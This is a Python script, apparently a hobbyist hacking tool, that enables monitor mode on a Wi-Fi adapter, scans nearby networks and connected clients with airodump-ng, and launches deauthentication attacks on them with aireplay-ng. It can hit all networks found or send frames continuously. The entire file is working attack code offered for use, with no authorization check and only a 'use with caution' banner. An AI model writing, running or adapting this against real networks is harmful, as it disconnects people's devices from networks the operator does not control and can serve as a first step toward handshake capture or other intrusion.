# -*- coding: utf-8 -*-

import os
import subprocess
import csv
import signal
import time
import ctypes
import sys
import glob

print('''

██╗    ██╗██╗███████╗██╗                                                                
██║    ██║██║██╔════╝██║                                                                
██║ █╗ ██║██║█████╗  ██║                                                                
██║███╗██║██║██╔══╝  ██║                                                                
╚███╔███╔╝██║██║     ██║                                                                
╚══╝╚══╝ ╚═╝╚═╝     ╚═╝                                                                
                                                                                        
█████╗ ██████╗  ██████╗ ███╗   ███╗██╗███╗   ██╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██║████╗  ██║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
███████║██████╔╝██║   ██║██╔████╔██║██║██╔██╗ ██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
██╔══██║██╔══██╗██║   ██║██║╚██╔╝██║██║██║╚██╗██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██║  ██║██████╔╝╚██████╔╝██║ ╚═╝ ██║██║██║ ╚████║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                                                                                        
made by ssskingsss12 

use with caution
''')

# Constants
MENU_OPTIONS = {
    "1": "Enable Monitor Mode",
    "2": "Scan Networks and Clients",
    "3": "Perform Deauthentication Attack",
    "4": "Exit",
}

# Global variable for monitor mode adapter
monitor_adapter = None

# Signal handling - return to menu instead of exiting
def signal_handler(sig, frame):
    print("\n\n[+] Returning to menu...")
    raise KeyboardInterrupt

def run_command(command, show_output=False):
    """Run command and optionally show output in real-time"""
    try:
        if show_output:
            # Run command and show output in real-time
            process = subprocess.Popen(command, shell=True)
            process.wait()
            return "", ""
        else:
            process = subprocess.Popen(command, shell=True, 
                                      stdout=subprocess.PIPE, 
                                      stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            return stdout.strip(), stderr.strip()
    except Exception as e:
        return "", str(e)

def is_wsl():
    """Detect if running inside Windows Subsystem for Linux."""
    output, _ = run_command("uname -a")
    return "microsoft" in output.lower()

def get_adapter_mode(interface):
    """Get current mode of a wireless adapter"""
    output, _ = run_command("iw dev {} info".format(interface))
    for line in output.splitlines():
        if "type" in line:
            mode = line.split()[-1]
            return mode
    return "unknown"

def list_network_adapters():
    """List all wireless adapters and their current mode"""
    adapters = []

    # Check if running under WSL
    if is_wsl():
        print("[!] Detected Windows Subsystem for Linux (WSL).")
        print("    Wi-Fi adapters cannot be directly accessed from WSL.")
        print("    Please run this script on native Linux or attach a USB Wi-Fi adapter.")
        return adapters

    # Get all wireless interfaces
    output, error = run_command("iw dev")
    if output:
        current_interface = None
        for line in output.splitlines():
            if line.strip().startswith("Interface"):
                current_interface = line.split()[1]
            elif "type" in line and current_interface:
                mode = line.split()[-1]
                adapters.append((current_interface, mode))
                current_interface = None
        
        return adapters

    return adapters

def check_for_monitor_adapter():
    """Automatically detect if any adapter is in monitor mode"""
    global monitor_adapter
    adapters = list_network_adapters()
    
    for name, mode in adapters:
        if mode == "monitor":
            monitor_adapter = name
            print("[+] Found adapter in monitor mode: {}".format(monitor_adapter))
            return True
    
    print("[!] No adapters found in monitor mode.")
    return False

def enable_monitor_mode():
    """Enable monitor mode on a selected adapter"""
    global monitor_adapter
    
    adapters = list_network_adapters()
    if not adapters:
        print("[!] No wireless adapters found.")
        return False
    
    print("\n[+] Available wireless adapters:")
    for i, (name, mode) in enumerate(adapters, start=1):
        print("    {}. {} (Current mode: {})".format(i, name, mode))
    
    try:
        adapter_choice = int(raw_input("\nSelect adapter number: ").strip())
        if adapter_choice < 1 or adapter_choice > len(adapters):
            print("[!] Invalid choice.")
            return False
        
        selected_adapter = adapters[adapter_choice - 1][0]
        current_mode = get_adapter_mode(selected_adapter)
        
        if current_mode == "monitor":
            print("[+] {} is already in monitor mode.".format(selected_adapter))
            monitor_adapter = selected_adapter
            return True
        
        # Enable monitor mode
        print("[+] Setting {} to monitor mode...".format(selected_adapter))
        
        commands = [
            "sudo ip link set {} down".format(selected_adapter),
            "sudo iw dev {} set type monitor".format(selected_adapter),
            "sudo ip link set {} up".format(selected_adapter),
        ]
        
        for cmd in commands:
            output, error = run_command(cmd)
            if error:
                print("[!] Error: {}".format(error))
                return False
        
        print("[+] Monitor mode enabled on {}".format(selected_adapter))
        monitor_adapter = selected_adapter
        return True
        
    except ValueError:
        print("[!] Invalid input.")
        return False
    except KeyboardInterrupt:
        print("\n[+] Operation cancelled.")
        return False

def scan_networks_and_clients():
    """Scan for networks and clients with visible airodump output"""
    global monitor_adapter
    
    # Set signal handler for this function
    original_sigint = signal.signal(signal.SIGINT, signal_handler)
    
    try:
        # Check if we have a monitor mode adapter
        if not monitor_adapter:
            print("[!] No adapter in monitor mode found!")
            print("    Please enable monitor mode first (Option 1)")
            return
        
        # Verify adapter is still in monitor mode
        if get_adapter_mode(monitor_adapter) != "monitor":
            print("[!] {} is no longer in monitor mode!".format(monitor_adapter))
            print("    Please re-enable monitor mode (Option 1)")
            monitor_adapter = None
            return
        
        # Ask for scan duration
        print("\n[+] Enter scan duration in seconds (recommended: 15-30 seconds)")
        print("    Press Enter for default (20 seconds)")
        try:
            duration_input = raw_input("Duration: ").strip()
            if duration_input:
                scan_duration = int(duration_input)
            else:
                scan_duration = 20
        except ValueError:
            print("[!] Invalid input, using default 20 seconds")
            scan_duration = 20
        except KeyboardInterrupt:
            print("\n[+] Scan cancelled.")
            return
        
        # Clean up old CSV files
        for f in glob.glob("scan-*.csv"):
            try:
                os.remove(f)
            except:
                pass
        for f in glob.glob("client_*.csv"):
            try:
                os.remove(f)
            except:
                pass
        
        # Step 1: Scan for networks
        print("\n[+] Scanning for networks on {}...".format(monitor_adapter))
        print("[+] Scanning for {} seconds... (Press Ctrl+C to stop early)\n".format(scan_duration))
        
        scan_file = "scan"
        cmd = "sudo airodump-ng {} -w {} --output-format csv".format(monitor_adapter, scan_file)
        
        try:
            # Show airodump output in real-time
            process = subprocess.Popen(cmd, shell=True)
            
            # Countdown timer
            for i in range(scan_duration, 0, -1):
                sys.stdout.write("\r[+] Time remaining: {} seconds...".format(i))
                sys.stdout.flush()
                time.sleep(1)
            
            print("\n")
            process.terminate()
            time.sleep(2)
            print("\n[+] Network scan complete!")
        except KeyboardInterrupt:
            print("\n[+] Scan interrupted by user")
            process.terminate()
            time.sleep(2)
            return
        except Exception as e:
            print("\n[!] Error during scan: {}".format(e))
            return
        
        # Find the CSV file
        csv_files = glob.glob("scan-*.csv")
        if not csv_files:
            print("[!] No scan results found!")
            print("[!] Make sure airodump-ng is installed: sudo apt-get install aircrack-ng")
            return
        
        network_csv = csv_files[0]
        networks = parse_network_csv(network_csv)
        
        if not networks:
            print("[!] No networks found.")
            return
        
        print("\n[+] Found {} networks:".format(len(networks)))
        for i, (bssid, signal, channel, ssid) in enumerate(networks[:15], 1):
            if ssid:
                print("    {}. {} - {} (Ch: {}, Signal: {})".format(i, ssid[:20], bssid, channel, signal))
            else:
                print("    {}. Hidden - {} (Ch: {}, Signal: {})".format(i, bssid, channel, signal))
        
        # Save networks first
        save_scan_results(networks, {})
        print("[+] Networks saved to scan_data.csv")
        
        # Ask user if they want to scan for clients
        try:
            scan_clients = raw_input("\n[+] Scan for clients on these networks? (y/n): ").strip().lower()
            if scan_clients != 'y':
                print("[+] Skipping client scan.")
                return
            
            # Ask for client scan duration
            print("\n[+] Enter client scan duration in seconds (recommended: 10-15 seconds)")
            print("    Press Enter for default (10 seconds)")
            try:
                duration_input = raw_input("Duration: ").strip()
                if duration_input:
                    client_duration = int(duration_input)
                else:
                    client_duration = 10
            except ValueError:
                print("[!] Invalid input, using default 10 seconds")
                client_duration = 10
            except KeyboardInterrupt:
                print("\n[+] Client scan cancelled.")
                return
            
            # Step 2: Scan for clients on each network (limit to first 5 networks to save time)
            clients_data = {}
            networks_to_scan = networks[:5]  # Scan first 5 networks
            
            print("\n[+] Scanning for clients on {} networks...".format(len(networks_to_scan)))
            
            for idx, (bssid, signal, channel, ssid) in enumerate(networks_to_scan, 1):
                network_name = ssid if ssid else "Hidden Network"
                print("\n[{}/{}] Scanning clients for: {}".format(idx, len(networks_to_scan), network_name))
                print("    BSSID: {}, Channel: {}".format(bssid, channel))
                
                client_prefix = "client_{}".format(bssid.replace(":", ""))
                cmd = "sudo airodump-ng --bssid {} -c {} {} -w {} --output-format csv".format(
                    bssid, channel, monitor_adapter, client_prefix)
                
                try:
                    # Show client scan
                    process = subprocess.Popen(cmd, shell=True)
                    
                    # Countdown timer
                    for i in range(client_duration, 0, -1):
                        sys.stdout.write("\r    Time remaining: {} seconds...".format(i))
                        sys.stdout.flush()
                        time.sleep(1)
                    
                    print("\n")
                    process.terminate()
                    time.sleep(1)
                except KeyboardInterrupt:
                    print("\n    Client scan interrupted")
                    process.terminate()
                    time.sleep(1)
                    continue
                
                # Find the CSV file
                csv_files = glob.glob("{}*.csv".format(client_prefix))
                if csv_files:
                    clients = parse_client_csv(csv_files[0])
                    clients_data[bssid] = {
                        'ssid': ssid,
                        'channel': channel,
                        'signal': signal,
                        'clients': clients
                    }
                    print("    Found {} clients".format(len(clients)))
                    for client in clients[:5]:
                        print("        - {}".format(client))
                else:
                    clients_data[bssid] = {
                        'ssid': ssid,
                        'channel': channel,
                        'signal': signal,
                        'clients': []
                    }
                    print("    No clients found")
            
            # Update results with clients
            save_scan_results(networks, clients_data)
            print("\n[+] Updated results with clients saved to scan_data.csv")
            
        except KeyboardInterrupt:
            print("\n[+] Operation cancelled.")
            return
            
    finally:
        # Restore original signal handler
        signal.signal(signal.SIGINT, original_sigint)

def parse_network_csv(file_path):
    """Parse airodump-ng network CSV file for version 1.2 beta3"""
    networks = []
    
    try:
        with open(file_path, 'r') as file:
            reader = csv.reader(file)
            for row in reader:
                # Skip empty rows
                if not row:
                    continue
                
                # Check if it's a network row (has BSSID)
                if row[0] and len(row[0]) == 17 and ":" in row[0]:
                    bssid = row[0].strip()
                    channel = row[3].strip() if len(row) > 3 else ""
                    signal = row[8].strip() if len(row) > 8 else ""
                    ssid = row[13].strip() if len(row) > 13 else ""
                    # Only add if it's a valid network (not a client station)
                    if bssid and "BSSID" not in bssid:
                        networks.append((bssid, signal, channel, ssid))
    except Exception as e:
        print("[!] Error parsing CSV: {}".format(e))
    
    return networks

def parse_client_csv(file_path):
    """Parse airodump-ng client CSV file for version 1.2 beta3"""
    clients = []
    in_station_section = False
    
    try:
        with open(file_path, 'r') as file:
            reader = csv.reader(file)
            for row in reader:
                if not row:
                    continue
                
                # Look for station section (airodump-ng 1.2 format)
                if len(row) > 0 and row[0] == "Station MAC":
                    in_station_section = True
                    continue
                
                # If we're in station section and have a MAC address
                if in_station_section and len(row) > 0 and row[0]:
                    if len(row[0]) == 17 and ":" in row[0] and "Station MAC" not in row[0]:
                        clients.append(row[0].strip())
                
                # Also check for MAC addresses in other rows (fallback)
                elif len(row) > 0 and row[0] and len(row[0]) == 17 and ":" in row[0]:
                    if "BSSID" not in row[0] and "Station MAC" not in row[0]:
                        clients.append(row[0].strip())
    except Exception as e:
        print("[!] Error parsing client CSV: {}".format(e))
    
    return list(set(clients))  # Remove duplicates

def save_scan_results(networks, clients_data):
    """Save scan results to a single CSV file for deauth attack"""
    with open("scan_data.csv", "w") as file:
        # Write header
        file.write("BSSID,SSID,Channel,Signal,Clients\n")
        
        # Write each network and its clients
        for bssid, signal, channel, ssid in networks:
            clients = clients_data.get(bssid, {}).get('clients', [])
            clients_str = ";".join(clients) if clients else "None"
            file.write("{},{},{},{},{}\n".format(
                bssid,
                ssid if ssid else "Hidden",
                channel,
                signal,
                clients_str
            ))

def load_scan_results():
    """Load scan results from CSV file"""
    networks = {}
    
    if not os.path.exists("scan_data.csv"):
        return networks
    
    try:
        with open("scan_data.csv", 'r') as file:
            reader = csv.reader(file)
            next(reader)  # Skip header
            for row in reader:
                if len(row) >= 5:
                    bssid = row[0].strip()
                    ssid = row[1].strip()
                    channel = row[2].strip()
                    signal = row[3].strip()
                    clients_str = row[4].strip()
                    
                    clients = []
                    if clients_str and clients_str != "None":
                        clients = clients_str.split(";")
                    
                    networks[bssid] = {
                        'ssid': ssid if ssid != "Hidden" else "",
                        'channel': channel,
                        'signal': signal,
                        'clients': clients
                    }
    except Exception as e:
        print("[!] Error loading scan results: {}".format(e))
    
    return networks

def deauth_attack():
    """Perform deauthentication attack"""
    global monitor_adapter
    
    # Set signal handler for this function
    original_sigint = signal.signal(signal.SIGINT, signal_handler)
    
    try:
        # Check if we have a monitor mode adapter
        if not monitor_adapter:
            print("[!] No adapter in monitor mode found!")
            print("    Please enable monitor mode first (Option 1)")
            return
        
        # Verify adapter is still in monitor mode
        if get_adapter_mode(monitor_adapter) != "monitor":
            print("[!] {} is no longer in monitor mode!".format(monitor_adapter))
            print("    Please re-enable monitor mode (Option 1)")
            monitor_adapter = None
            return
        
        # Check if scan results exist
        if not os.path.exists("scan_data.csv"):
            print("[!] No scan data found!")
            print("    Please run a scan first (Option 2)")
            return
        
        # Load scan results
        networks = load_scan_results()
        
        if not networks:
            print("[!] No valid network data found in scan_data.csv")
            print("    Please run a new scan (Option 2)")
            return
        
        print("\n[+] Networks with clients:")
        network_list = []
        for i, (bssid, data) in enumerate(networks.items(), 1):
            if data.get('clients') and len(data['clients']) > 0:
                network_list.append((bssid, data))
                network_name = data['ssid'] if data['ssid'] else "Hidden Network"
                print("    {}. {} - {} ({} clients)".format(i, network_name, bssid, len(data['clients'])))
        
        if not network_list:
            print("[!] No networks with clients found!")
            return
        
        try:
            choice = raw_input("\nSelect network number to attack (or 'a' for all): ").strip()
            
            if choice.lower() == 'a':
                for bssid, data in network_list:
                    network_name = data['ssid'] if data['ssid'] else "Hidden Network"
                    print("\n[+] Attacking {} ({})".format(network_name, bssid))
                    perform_deauth(monitor_adapter, bssid, data['clients'])
            else:
                idx = int(choice) - 1
                if 0 <= idx < len(network_list):
                    bssid, data = network_list[idx]
                    network_name = data['ssid'] if data['ssid'] else "Hidden Network"
                    print("\n[+] Selected: {} ({})".format(network_name, bssid))
                    print("[+] Clients: {}".format(', '.join(data['clients'])))
                    confirm = raw_input("\nStart deauth attack? (y/n): ").strip().lower()
                    
                    if confirm == 'y':
                        # Ask for number of deauth packets
                        print("\n[+] Enter number of deauth packets to send (0 for continuous, 10-20 recommended)")
                        packet_input = raw_input("Packets: ").strip()
                        try:
                            packets = int(packet_input) if packet_input else 10
                        except:
                            packets = 10
                        
                        perform_deauth(monitor_adapter, bssid, data['clients'], packets)
                else:
                    print("[!] Invalid selection")
        except ValueError:
            print("[!] Invalid input")
        except KeyboardInterrupt:
            print("\n[+] Attack cancelled")
            
    finally:
        # Restore original signal handler
        signal.signal(signal.SIGINT, original_sigint)

def perform_deauth(interface, bssid, clients, packets=10):
    """Perform the actual deauthentication attack"""
    if not clients:
        print("[!] No clients to deauthenticate.")
        return
    
    print("\n[+] Starting deauthentication attack on {} clients".format(len(clients)))
    print("[+] Sending {} deauth packets to each client".format(packets if packets > 0 else "continuous"))
    print("[+] Press Ctrl+C to stop the attack\n")
    
    try:
        for client in clients:
            print("[+] Deauthenticating {} from {}".format(client, bssid))
            run_command("sudo aireplay-ng -0 {} -a {} -c {} {}".format(packets, bssid, client, interface))
            time.sleep(0.5)
        print("\n[+] Attack completed!")
    except KeyboardInterrupt:
        print("\n[+] Deauthentication attack stopped by user")

def is_admin():
    if os.name == 'nt':
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    else:
        return os.geteuid() == 0

def main():
    global monitor_adapter
    
    if not is_admin():
        print("[!] This script must be run as root!")
        print("    Please run with: sudo python wifida.py")
        return
    
    # Check for existing monitor mode adapter
    check_for_monitor_adapter()
    
    # Set up main signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    while True:
        try:
            print("\n" + "="*50)
            print("Wi-Fi Deauthentication Tool")
            if monitor_adapter:
                print("Current Monitor Adapter: {}".format(monitor_adapter))
            else:
                print("Current Monitor Adapter: None")
            print("="*50)
            
            for key, value in MENU_OPTIONS.items():
                print("  {}: {}".format(key, value))
            
            choice = raw_input("\nChoose an option: ").strip()

            if choice == "1":
                if enable_monitor_mode():
                    print("\n[+] Monitor mode is ready!")
                else:
                    print("\n[!] Failed to enable monitor mode")
            
            elif choice == "2":
                scan_networks_and_clients()
            
            elif choice == "3":
                deauth_attack()
            
            elif choice == "4":
                print("\n[+] Exiting tool.")
                if monitor_adapter:
                    print("[*] Note: {} remains in monitor mode".format(monitor_adapter))
                    print("    To disable monitor mode, run: sudo iw dev {} set type managed".format(monitor_adapter))
                break
            
            else:
                print("[!] Invalid choice. Please try again.")
                
        except KeyboardInterrupt:
            print("\n[+] Returning to menu...")
            continue

if __name__ == "__main__":
    main()